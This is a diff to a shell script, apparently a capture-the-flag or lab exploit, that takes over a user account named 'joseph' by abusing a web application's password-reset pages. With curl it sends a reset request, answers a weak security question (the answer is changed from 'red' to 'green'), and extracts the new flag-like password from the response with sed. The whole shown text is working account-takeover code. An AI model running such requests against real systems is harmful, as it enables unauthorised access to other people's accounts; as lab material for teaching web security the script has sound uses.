@@ -19,8 +19,9 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Reseting joseph password
 echo "2 - RESETING JOSEPH PASSWORD"
-curl -s -X POST "http://$target_ip:85/resetpass1.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=joseph" -v
+curl -s -X POST "http://$target_ip:85/resetpass1.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=joseph" > /dev/null
 
 # Answering too easy security question
 echo "3 - ANSWERING SECURITY QUESTION"
-curl -s -X POST "http://$target_ip:85/resetpass2.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "q=2" -d "a=red" -v
+curl -s -X POST "http://$target_ip:85/resetpass2.php" -b /work/cookie-id.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "q=2" -d "a=green" > /work/password.html
+echo "--> New password ix : $(sed -n 's/.*to\(.*{.*}\)<\/p>.*/\1/p' /work/password.html)"
